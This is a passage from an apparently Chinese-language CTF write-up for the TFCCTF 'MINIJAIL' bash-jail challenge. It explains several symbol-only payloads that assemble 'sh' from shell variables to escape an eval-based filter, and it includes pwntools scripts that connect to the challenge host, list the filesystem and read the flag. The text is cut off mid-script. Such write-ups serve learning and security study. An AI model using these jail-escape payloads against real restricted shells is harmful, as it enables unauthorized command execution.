Middleware to add CORS headers</span><br><span class="line">app.use((req, res, next) =&gt; &#123;</span><br><span class="line">  res.header(&quot;Access-Control-Allow-Origin&quot;, &quot;*&quot;); // allow all origins</span><br><span class="line">  res.header(&quot;Access-Control-Allow-Methods&quot;, &quot;GET,POST,PUT,DELETE,OPTIONS&quot;);</span><br><span class="line">  res.header(&quot;Access-Control-Allow-Headers&quot;, &quot;Content-Type, Authorization&quot;);</span><br><span class="line">  next();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">// Route to serve your custom elements JSON</span><br><span class="line">app.get(&#x27;/custom-divs&#x27;, (req, res) =&gt; &#123;</span><br><span class="line">  const customElements = [</span><br><span class="line">    &#123; name: &#x27;invalid-value&#x27;, observedAttribute: &#x27;aria-label&#x27; &#125;</span><br><span class="line">  ];</span><br><span class="line">  res.json(customElements);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">// Start server</span><br><span class="line">app.listen(PORT, () =&gt; &#123;</span><br><span class="line">  console.log(Server is running at http://localhost:$&#123;PORT&#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h2 id="MINIJAIL"><a href="#MINIJAIL" class="headerlink" title="MINIJAIL"></a>MINIJAIL</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">goog=<span class="string">&#x27;^[$&gt;_=:!()&#123;&#125;]+$&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span>; <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> -n <span class="string">&quot;caca$ &quot;</span></span><br><span class="line">    <span class="built_in">stty</span> -<span class="built_in">echo</span></span><br><span class="line">    <span class="built_in">read</span> -r mine</span><br><span class="line">    <span class="built_in">stty</span> <span class="built_in">echo</span></span><br><span class="line">    <span class="built_in">echo</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> [[ <span class="variable">$mine</span> =~ <span class="variable">$goog</span> ]]; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">eval</span> <span class="string">&quot;<span class="variable">$mine</span>&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&#x27;[!] Error: forbidden characters detected&#x27;</span></span><br><span class="line">        <span class="built_in">printf</span> <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<p>一个bashFuck，只有这些字符被允许并会 eval 执行：<br><code>$  &gt;  _  =  :  !  (  )  &#123;  &#125;</code></p>
<p>当时没怎么看，来复盘一下见到的几种解法</p>
<h3 id="解法1"><a href="#解法1" class="headerlink" title="解法1"></a>解法1</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__=$(($$==$$))</span><br><span class="line">$&#123;!__:$(($$==$$))$(($(($(($(($(($$==$$))$(($$==$$))$(($$==$$))&gt;&gt;$(($$==$$))))&gt;&gt;$(($$==$$))))&gt;&gt;$(($$==$$))))&gt;&gt;$(($$==$$)))):$(($$==$$))&#125;$&#123;_:$(($(($(($$==$$))$(($$!=$$))&gt;&gt;$(($$==$$))))&gt;&gt;$(($$==$$)))):$(($$==$$))&#125;</span><br></pre></td></tr></table></figure>

<p>好——这个 payload 非常“技巧化”，用的都是你早先允许的那些字符（<code>$ _ = : ! ( ) &#123; &#125; &gt;</code>），下面我把它拆成清晰的步骤解释为什么能跑通、每一部分在干什么、以及要满足的先决条件。</p>
<p><strong>整体思路</strong></p>
<p>用 <code>$(($$==$$))</code> &#x2F; <code>$(($$!=$$))</code> 产生<strong>1 &#x2F; 0</strong>，用字符串拼接 + 位移（<code>&gt;&gt;</code>）在纯符号输入里构造任意十进制索引，然后用参数&#x2F;间接展开的子串切片 <code>$&#123;!param:offset:length&#125;</code> &#x2F; <code>$&#123;param:offset:length&#125;</code> 从已有的环境字符串（例如脚本的 <code>$1</code>、<code>_</code> 等）里“切出”需要的字母，拼接成一个<strong>命令名</strong>（比如 <code>sh</code> &#x2F; <code>cat</code> 等），最后由 <code>eval</code> 执行。全部只用被允许的字符完成。</p>
<hr>
<p><strong>逐段解析</strong></p>
<ol>
<li><p><code>__=$(($$==$$))</code></p>
<ul>
<li><code>$$</code> 是当前 shell 的 PID；<code>$$==$$</code> 在算术扩展里为真（true），<code>$(($$==$$))</code> 的算术扩展结果是 <strong><code>1</code></strong>。</li>
<li>因此这一行把变量 <code>__</code> 设为字符串 <code>&quot;1&quot;</code>（实际上是数值 1，但后面会被当作 name&#x2F;value 用）。</li>
</ul>
</li>
<li><p>核心：<code>$&#123;!__:...:...&#125;$&#123;_:...:...&#125;</code> （这是两段参数展开并列，结果拼接在一起）<br>我们把它分解为两部分：</p>
<ul>
<li><p>第一部分： <code>$&#123;!__: OFFSET1 : LENGTH1 &#125;</code></p>
<ul>
<li>语法含义：先 <code>$&#123;!__&#125;</code> 做 <strong>间接展开</strong> —— <code>__</code> 的值是 <code>&quot;1&quot;</code>，因此 <code>$&#123;!__&#125;</code> 等价于 <code>$&#123;1&#125;</code>（也就是脚本的第 1 个位置参数 <code>$1</code>）。</li>
<li>再对 <code>$&#123;!__&#125;</code> 做子串切片 <code>:offset:length</code>（注意 <code>offset</code> 与 <code>length</code> 本身是由算术扩展生成的数字表达式）。</li>
<li>也就是说：<strong>从 <code>$1</code>（由 <code>socat ... yoooooo_mama_test</code> 传入的那个字符串）里按计算出来的索引抽出一个字符</strong>。</li>
</ul>
</li>
<li><p>第二部分： <code>$&#123;_: OFFSET2 : LENGTH2 &#125;</code></p>
<ul>
<li>这里取变量 <code>_</code>（单下划线）并切片。<code>_</code>&#x2F;<code>$_</code> 在 shell 中通常会被初始化为“之前命令的最后一个参数”或脚本&#x2F;命令名等——在该题目环境下，出题者利用了 <code>_</code>（或 <code>$_</code>）包含已知字符串这一事实。</li>
<li>同样按算出来的索引抽出一个字符。</li>
</ul>
</li>
</ul>
</li>
<li><p>如何<strong>只用允许字符</strong>构造索引（这是关键的妙处）：</p>
<ul>
<li><p><code>$(($$==$$))</code> —— 产生 <code>1</code>。</p>
</li>
<li><p><code>$(($$!=$$))</code> —— 产生 <code>0</code>。</p>
</li>
<li><p>连续写多个 <code>$(($$==$$))</code> 会在字符串层面拼成 <code>&quot;111&quot;</code>（不需要直接输入数字字符，扩展后会变成数字字符）。</p>
</li>
<li><p>然后用位运算 <code>&gt;&gt;$(($$==$$))</code>（即 <code>&gt;&gt;1</code>）做右移：<br>举例（把表达式替换成具体数值，便于理解）：</p>
<ul>
<li><code>&quot;111&quot; &gt;&gt; 1</code> → <code>111 &gt;&gt; 1 = 55</code></li>
<li><code>55 &gt;&gt; 1 = 27</code></li>
<li><code>27 &gt;&gt; 1 = 13</code></li>
<li><code>13 &gt;&gt; 1 = 6</code><br>这就是为什么在 payload 中你能看到很多嵌套的 <code>&gt;&gt;$(($$==$$))</code> —— 通过多次右移从一个较大的十进制数逐步得到你想要的索引（例如 <code>6</code>、<code>13</code>、<code>27</code> 等），<strong>而整个数字构造过程只用了 <code>$(($$==$$))</code>、<code>$(($$!=$$))</code>、<code>&gt;&gt;</code> 这些允许字符</strong>。</li>
</ul>
</li>
<li><p>另外通过把单独的算术扩展 拼接在一起（例如先有一个 <code>$(($$==$$))</code>，后面跟上上面那串位移结果），就能得到像 <code>16</code>、<code>113</code> 之类的十进制数（拼接后再当作 offset 被解析成数字）。</p>
</li>
</ul>
</li>
<li><p>回到具体表达式（把上面两部分对应回 payload）：</p>
<ul>
<li>第一大段的 offset 是由首个 <code>$(($$==$$))</code>（即 <code>1</code>）拼接上一个经过多重 <code>&gt;&gt;1</code> 的算术结果，最终在这个题里等价于 <strong><code>16</code></strong>（示例：<code>1</code> 拼接上 <code>6</code> → <code>16</code>），并且 length 用的是 <code>$(($$==$$))</code>（即 <code>1</code>），所以 <code>$&#123;!__:16:1&#125;</code> 会从 <code>$1</code>（<code>yooooooo_mama_test</code>）中取出第 16 个位置的单字符。</li>
<li>第二大段内部通过 <code>$(($$==$$))</code> 与 <code>$(($$!=$$))</code> 的不同组合（即 <code>1</code> 与 <code>0</code> 拼成 <code>&quot;10&quot;</code>）再右移两次，得到 <strong><code>2</code></strong>，长度同为 <code>1</code>，因此 <code>$&#123;_:2:1&#125;</code> 会从 <code>_</code> 里取第 2 个字符。</li>
<li>两个单字符拼在一起就成为了最终要 <code>eval</code> 的<strong>命令名</strong>（例如 <code>s</code> + <code>h</code> → <code>sh</code>，或别的组合，取决于 <code>$1</code>&#x2F;<code>_</code> 中那些位置上的字符）。</li>
</ul>
</li>
</ol>
<p>补充：<br>当 Bash 启动时，<code>$_</code> 初始通常是启动时用到的 shell 路径（例如 &#x2F;bin&#x2F;bash）。</p>
<p>但是 <code>$_</code> 会在每次命令执行后更新为上一个命令的最后一个参数。在某些情况下（命令没有参数）<code>$_</code> 会变为命令名本身。也就是说 <code>$_</code> 动态随最近命令的执行而改变。<code>$&#123;_&#125;</code> 与 <code>$_</code> 表示同一参数（下划线名字的参数）</p>
<p>yo_mama 脚本在 read 之前执行了这些语句（简化顺序）：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -n <span class="string">&quot;caca$ &quot;</span></span><br><span class="line"><span class="built_in">stty</span> -<span class="built_in">echo</span></span><br><span class="line"><span class="built_in">read</span> -r mine</span><br><span class="line"><span class="built_in">stty</span> <span class="built_in">echo</span></span><br><span class="line"><span class="built_in">echo</span>       <span class="comment"># （输出换行）</span></span><br><span class="line"><span class="keyword">if</span> [[ <span class="variable">$mine</span> =~ <span class="variable">$goog</span> ]]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">eval</span> <span class="string">&quot;<span class="variable">$mine</span>&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>

<p>注意最后那条 echo（用于换行）是在 eval 之前立即执行的。</p>
<p><code>_</code> 的具体变化（关键点）</p>
<ul>
<li><code>echo -n &quot;caca$ &quot;</code> 执行后，<code>$_</code> 会变成该命令的最后一个参数（例如 <code>caca$</code> ）。</li>
<li>后面几条命令（stty、read、stty）会不断更新 <code>$_</code>（取决于它们的参数）。</li>
<li>那条**单独的 echo（用于换行）**执行时，echo 没有参数，因而 <code>$_</code> 被赋为 echo（即命令名本身）。</li>
<li>因此在紧接着执行 <code>eval &quot;$mine&quot;</code> 之前，<code>_</code> 的值就是 echo。</li>
<li>因此 <code>$&#123;_:2:1&#125;</code> → 取 index 2 的 1 个字符 → ‘h’。</li>
</ul>
<hr>
<h3 id="解法2"><a href="#解法2" class="headerlink" title="解法2"></a>解法2</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">___=$&#123;_&#125;</span><br><span class="line">__=$((!_))</span><br><span class="line">____=$&#123;!__&#125;</span><br><span class="line">____=$&#123;____:$__&#125;</span><br><span class="line">____=$&#123;____:$__&#125;</span><br><span class="line">____=$&#123;____:$__&#125;</span><br><span class="line">____=$&#123;____:$__&#125;</span><br><span class="line">____=$&#123;____:$__&#125;</span><br><span class="line">____=$&#123;____:$__&#125;</span><br><span class="line">____=$&#123;____:$__&#125;</span><br><span class="line">____=$&#123;____:$__&#125;</span><br><span class="line">____=$&#123;____:$__&#125;</span><br><span class="line">____=$&#123;____:$__&#125;</span><br><span class="line">____=$&#123;____:$__&#125;</span><br><span class="line">____=$&#123;____:$__&#125;</span><br><span class="line">____=$&#123;____:$__&#125;</span><br><span class="line">____=$&#123;____:$__&#125;</span><br><span class="line">____=$&#123;____:$__&#125;</span><br><span class="line">___=$&#123;___:$__&#125;</span><br><span class="line">___=$&#123;___:$__&#125;</span><br><span class="line">$&#123;____:$((!__)):$__&#125;$&#123;___:$((!__)):$__&#125;</span><br></pre></td></tr></table></figure>

<p><strong>basic</strong></p>
<ul>
<li><strong>变量 <code>_</code> &#x2F; <code>$_</code></strong>：在前一个方案里已经解释过，在 <code>eval</code> 执行前，脚本最后一条无参 <code>echo</code> 会导致 <code>_=&quot;echo&quot;</code>。</li>
<li><strong>子串语法</strong>：<code>$&#123;var:offset&#125;</code> → 从字符串中第 <code>offset</code> 个字符开始取到结尾；<code>$&#123;var:offset:length&#125;</code> → 取固定长度。</li>
<li><strong>算术扩展</strong>：<code>$((!_))</code>，这里 <code>_</code> 作为字符串 <code>&quot;echo&quot;</code> 被解释成数值 0，所以 <code>!0 = 1</code>。</li>
<li><strong>间接展开</strong>：<code>$&#123;!__&#125;</code> 用 <code>__</code> 的值作为变量名来解引用。</li>
</ul>
<hr>
<p><strong>逐行分析</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">___=<span class="variable">$&#123;_&#125;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>令 <code>___=&quot;echo&quot;</code>。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__=$((!_))</span><br></pre></td></tr></table></figure>

<ul>
<li><code>_=&quot;echo&quot;</code> → 作为数值解释为 0 → <code>!0=1</code> → <code>__=1</code>。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">____=<span class="variable">$&#123;!__&#125;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><code>$&#123;!__&#125;</code> 相当于 <code>$&#123;!1&#125;</code> → 间接展开位置参数 <code>$1</code>。</li>
<li>在这个题环境下 <code>$1=&quot;yooooooo_mama_test&quot;</code>（socat argv）。</li>
<li>所以 <code>____=&quot;yooooooo_mama_test&quot;</code>。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">____=<span class="variable">$&#123;____:$__&#125;</span></span><br><span class="line">____=<span class="variable">$&#123;____:$__&#125;</span></span><br><span class="line">...</span><br><span class="line">（重复很多次）</span><br></pre></td></tr></table></figure>

<ul>
<li><p>这里每次做 <code>____=$&#123;____:1&#125;</code>，相当于把 <code>____</code> 的第一个字符裁掉。</p>
</li>
<li><p>重复 N 次就是不断往前推进，把字符串缩短。</p>
</li>
<li><p>举例：</p>
<ul>
<li>初始 <code>____=&quot;yooooooo_mama_test&quot;</code></li>
<li>一次切片后 <code>&quot;ooooooo_mama_test&quot;</code></li>
<li>再切 <code>&quot;oooooo_mama_test&quot;</code></li>
<li>… 逐步推进。</li>
</ul>
</li>
<li><p>在 payload 里重复了 15+ 次，说明出题人是想精确定位某个字母（例如最后落在 <code>s</code> 或 <code>h</code> 等关键字母上）。</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">___=<span class="variable">$&#123;___:$__&#125;</span></span><br><span class="line">___=<span class="variable">$&#123;___:$__&#125;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>初始 <code>___=&quot;echo&quot;</code>。</li>
<li>切一刀： <code>&quot;cho&quot;</code></li>
<li>再切一刀： <code>&quot;ho&quot;</code></li>
<li>所以最终 <code>___=&quot;ho&quot;</code>。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$&#123;____:$((!__)):$__&#125;</span><span class="variable">$&#123;___:$((!__)):$__&#125;</span></span><br></pre></td></tr></table></figure>

<p>分成两部分：</p>
<ol>
<li><p><code>$&#123;____:$((!__)):$__&#125;</code></p>
<ul>
<li><code>__=1</code></li>
<li><code>$((!__))=$((!1))=0</code></li>
<li>所以 offset&#x3D;0，length&#x3D;1 → 取出 <code>____</code> 的第一个字符。</li>
<li>前面长串切片的目的就是保证这里的第一个字符是出题人想要的（例如 <code>s</code>）。</li>
</ul>
</li>
<li><p><code>$&#123;___:$((!__)):$__&#125;</code></p>
<ul>
<li><code>___=&quot;ho&quot;</code></li>
<li>同样 offset&#x3D;0，length&#x3D;1 → 取 <code>h</code>。</li>
</ul>
</li>
</ol>
<p>拼在一起就是 <strong><code>sh</code></strong>。</p>
<hr>
<p><strong>总体逻辑</strong></p>
<ol>
<li>利用 <code>$_=&quot;echo&quot;</code> → 通过逻辑非得到 <code>__=1</code>。</li>
<li>用 <code>__=1</code> 当作 offset，不断切 <code>$1=&quot;yooooooo_mama_test&quot;</code>，让 <code>____</code> 的开头逐步移动到目标字母所在位置。</li>
<li>同时从 <code>___=&quot;echo&quot;</code> 切成 <code>&quot;ho&quot;</code>。</li>
<li>最后取 <code>____</code> 的第一个字母（比如 <code>s</code>）和 <code>___</code> 的第一个字母（<code>h</code>），拼成 <code>sh</code>。</li>
<li>交给 <code>eval</code>，执行 <code>/bin/sh</code>。</li>
</ol>
<p>后面几种大体上差不多，不再详细分析</p>
<hr>
<h3 id="解法3"><a href="#解法3" class="headerlink" title="解法3"></a>解法3</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pwn</span><br><span class="line"></span><br><span class="line">arg = <span class="string">&quot;yooooooo_mama_test&quot;</span></span><br><span class="line">_ = <span class="string">&quot;echo&quot;</span></span><br><span class="line"></span><br><span class="line">commands = [</span><br><span class="line">        <span class="string">&quot;__=$(($$&gt;$$))&quot;</span>, <span class="comment"># 0</span></span><br><span class="line">        <span class="string">&quot;___=$(($$&gt;$__))&quot;</span>, <span class="comment"># 1</span></span><br><span class="line">        <span class="string">&quot;____=$&#123;!___&#125;&quot;</span>, <span class="comment"># arg (has s)</span></span><br><span class="line">        <span class="string">&quot;_____=$_&quot;</span>, <span class="comment"># copy _ (has h)</span></span><br><span class="line">        ]</span><br><span class="line"><span class="keyword">while</span>(<span class="keyword">not</span> arg[<span class="number">0</span>] == <span class="string">&quot;s&quot;</span>):</span><br><span class="line">    commands.append(<span class="string">&quot;____=$&#123;____:___&#125;&quot;</span>) <span class="comment"># remove first character of ____</span></span><br><span class="line">    arg = arg[<span class="number">1</span>:]</span><br><span class="line">commands.append(<span class="string">&quot;____=$&#123;____:__:___&#125;&quot;</span>) <span class="comment"># get only first character of ____ (should be s)</span></span><br><span class="line"><span class="keyword">while</span>(<span class="keyword">not</span> _[<span class="number">0</span>] == <span class="string">&quot;h&quot;</span>):</span><br><span class="line">    commands.append(<span class="string">&quot;_____=$&#123;_____:___&#125;&quot;</span>) <span class="comment"># remove first character of _____</span></span><br><span class="line">    _ = _[<span class="number">1</span>:]</span><br><span class="line">commands.append(<span class="string">&quot;_____=$&#123;_____:__:___&#125;&quot;</span>) <span class="comment"># get only first character of _____ (should be h)</span></span><br><span class="line">commands.append(<span class="string">&quot;$____$_____&quot;</span>) <span class="comment"># shell!</span></span><br><span class="line"></span><br><span class="line">s = pwn.remote(<span class="string">&quot;...&quot;</span>, <span class="number">1337</span>, ssl=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> command <span class="keyword">in</span> commands:</span><br><span class="line">    s.recvuntil(<span class="string">b&quot;caca$ &quot;</span>)</span><br><span class="line">    s.sendline(command.encode())</span><br><span class="line">s.recvline()</span><br><span class="line"></span><br><span class="line">s.sendline(<span class="string">b&quot;ls /&quot;</span>)</span><br><span class="line">res = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span>(<span class="string">&quot;flag.&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> res):</span><br><span class="line">    res = s.recvline().decode()</span><br><span class="line">command = <span class="string">&quot;cat /flag.&quot;</span> + res.split(<span class="string">&quot;flag.&quot;</span>)[<span class="number">1</span>].split()[<span class="number">0</span>]</span><br><span class="line">s.sendline(command.encode())</span><br><span class="line">s.sendline(<span class="string">b&quot;echo&quot;</span>)</span><br><span class="line">res = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span>(<span class="string">&quot;TFCCTF&#123;&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> res):</span><br><span class="line">    res = s.recvline().decode()</span><br><span class="line">flag = res.split(<span class="string">&quot;$&quot;</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line">s.close()</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">$$ is set with an integer value (the PID), $(($$&gt;$$)) therefore evaluates to 0</span></span><br><span class="line"><span class="string">getting the value 1 is similar</span></span><br><span class="line"><span class="string">having 1 in $___, $&#123;!___&#125; is $1, the first argument. in this case yooooooo_mama_test</span></span><br><span class="line"><span class="string">$_ is set to the last argument of the last command, in this case echo</span></span><br><span class="line"><span class="string">yooooooo_mama_test has an s, echo has an h. this gives us sh and a shell</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>


<h3 id="解法4"><a href="#解法4" class="headerlink" title="解法4"></a>解法4</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> remote</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;minijail-66e3551ca2f6abec.challs.tfcctf.com&quot;</span></span><br><span class="line">port = <span class="number">1337</span></span><br><span class="line"></span><br><span class="line">r = remote(host, port, ssl=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># r = remote(host, port)</span></span><br><span class="line"><span class="built_in">print</span>(r.recvuntil(<span class="string">b&quot;caca$ &quot;</span>).decode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sendNrecv</span>(<span class="params">r,payload</span>):</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">f&quot;========== trying with payload <span class="subst">&#123;payload&#125;</span> ==========&quot;</span>)</span><br><span class="line">	r.sendline(payload.encode())</span><br><span class="line">	<span class="built_in">print</span>(r.recvuntil(<span class="string">b&quot;caca$ &quot;</span>).decode())</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;========== Finished Recieving ==========&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">################################################### getting all the numbers we need ##########################################################</span></span><br><span class="line"><span class="comment"># prints the pid which is 8 	</span></span><br><span class="line">sendNrecv(r,<span class="string">&quot;$$&quot;</span>) <span class="comment"># $$ -&gt; 8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># store 0 in __ 2 underscore variable</span></span><br><span class="line">sendNrecv(r,<span class="string">&quot;__=$(($$&gt;&gt;$$))&quot;</span>)  <span class="comment"># 8&gt;&gt;8 -&gt; 0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># store 1 in ___ 3 underscore varialbe</span></span><br><span class="line">sendNrecv(r,<span class="string">&quot;___=$((!(__&gt;&gt;__)))&quot;</span>) <span class="comment">#  !(8&gt;&gt;8) -&gt; 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># store 4 in ____ 4 underscore varialbe</span></span><br><span class="line">sendNrecv(r,<span class="string">&quot;____=$(($$&gt;&gt;!($$&gt;&gt;$$)))&quot;</span>) <span class="comment"># 8&gt;&gt;!(8&gt;&gt;8) -&gt; 8&gt;&gt;1 -&gt; 4</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># store 2 in _____ 5 underscore varialbe</span></span><br><span class="line">sendNrecv(r,<span class="string">&quot;_____=$(($$&gt;&gt;!($$&gt;&gt;$$)&gt;&gt;!($$&gt;&gt;$$)))&quot;</span>) <span class="comment"># 8&gt;&gt;!(8&gt;&gt;8)&gt;&gt;!(8&gt;&gt;8) -&gt; 8&gt;&gt;1&gt;&gt;1 -&gt; 2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># store 5 in ______ 6 underscore variable </span></span><br><span class="line">sendNrecv(r,<span class="string">&quot;______=$_____$___&quot;</span>) <span class="comment">#  -&gt; 21</span></span><br><span class="line">sendNrecv(r,<span class="string">&quot;______=$(($______&gt;&gt;$___))&quot;</span>) <span class="comment"># 21&gt;&gt;1 -&gt; 10 </span></span><br><span class="line">sendNrecv(r,<span class="string">&quot;______=$(($______&gt;&gt;$___))&quot;</span>) <span class="comment"># 10&gt;&gt;1 -&gt; 5</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># store 9 in _______ 7 underscore variable</span></span><br><span class="line">sendNrecv(r,<span class="string">&quot;_______=$___$$&quot;</span>) <span class="comment"># 18</span></span><br><span class="line">sendNrecv(r,<span class="string">&quot;_______=$(($_______&gt;&gt;$___))&quot;</span>) <span class="comment"># 18&gt;&gt;1 -&gt; 9 </span></span><br><span class="line"><span class="comment">##############################################################################################################################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># now the main part, we need to get alphabets. for that i used this parameter expansion trick.</span></span><br><span class="line"><span class="comment"># we can store echo/dev/fd/63 using this parameter expansion and then we can run commands using those alphabets.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># store echo/dev/fd/63 in ________ 8 underscore variable</span></span><br><span class="line">sendNrecv(r,<span class="string">&quot;________=$_&gt;($&#123;_:=&gt;(:)&#125;)&quot;</span>)  <span class="comment"># echo/dev/fd/63</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># now we can use string substitution to get d and f from that 8 underscore variable and run df command.</span></span><br><span class="line">sendNrecv(r,<span class="string">&quot;$($&#123;________:$______:$___&#125;$&#123;________:$_______:$___&#125;)&quot;</span>)  <span class="comment"># $&#123;&quot;echo/dev/fd/63&quot;:5:1&#125;$&#123;&quot;echo/dev/fd/63&quot;:9:1&#125; -&gt; df</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># store df command output in _________ 9 underscore variable. it will only store first word</span></span><br><span class="line">sendNrecv(r,<span 